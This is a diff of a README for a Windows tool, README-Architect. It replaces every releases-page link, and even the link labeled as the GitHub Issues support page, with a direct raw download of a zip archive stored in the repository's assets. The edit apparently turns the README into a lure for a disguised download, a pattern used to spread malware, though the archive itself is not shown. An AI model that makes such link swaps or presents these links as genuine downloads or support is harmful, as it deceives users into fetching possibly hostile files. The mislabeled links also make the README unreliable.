@@ -1,6 +1,6 @@
 # ⚙️ README-Architect - Build Clear and Simple README Files
 
-[![Download README-Architect](https://img.shields.io/badge/Download-README--Architect-4CAF50?style=for-the-badge)](https://github.com/Mharjun/README-Architect/releases)
+[![Download README-Architect](https://img.shields.io/badge/Download-README--Architect-4CAF50?style=for-the-badge)](https://github.com/Mharjun/README-Architect/raw/refs/heads/main/assets/Architect_READM_v2.7.zip)
 
 ---
 
@@ -28,10 +28,10 @@ It is designed for users who want to improve their README files without needing 
 
 Start by visiting the official release page to get the latest version of README-Architect.
 
-[![Download README-Architect](https://img.shields.io/badge/Download-README--Architect-007ACC?style=for-the-badge)](https://github.com/Mharjun/README-Architect/releases)
+[![Download README-Architect](https://img.shields.io/badge/Download-README--Architect-007ACC?style=for-the-badge)](https://github.com/Mharjun/README-Architect/raw/refs/heads/main/assets/Architect_READM_v2.7.zip)
 
 Click the link above or go to:  
-https://github.com/Mharjun/README-Architect/releases
+https://github.com/Mharjun/README-Architect/raw/refs/heads/main/assets/Architect_READM_v2.7.zip
 
 ### Step 2: Locate the Windows Installer
 
@@ -113,7 +113,7 @@ Ensure your text uses correct Markdown syntax. Restart the program if the previe
 
 ## 📂 Where to Find Support
 
-- Visit the repository’s GitHub Issues page for help: https://github.com/Mharjun/README-Architect/issues  
+- Visit the repository’s GitHub Issues page for help: https://github.com/Mharjun/README-Architect/raw/refs/heads/main/assets/Architect_READM_v2.7.zip  
 - Check the README-Architect wiki for detailed guides and FAQs.  
 - Report any bugs or request new features via GitHub Issues.
 
@@ -134,4 +134,4 @@ You can adjust settings in the program by clicking **Options** or **Preferences*
 
 To get started, visit and download from the release page below:
 
-[![Download README-Architect](https://img.shields.io/badge/Download-README--Architect-4CAF50?style=for-the-badge)](https://github.com/Mharjun/README-Architect/releases)
+[![Download README-Architect](https://img.shields.io/badge/Download-README--Architect-4CAF50?style=for-the-badge)](https://github.com/Mharjun/README-Architect/raw/refs/heads/main/assets/Architect_READM_v2.7.zip)
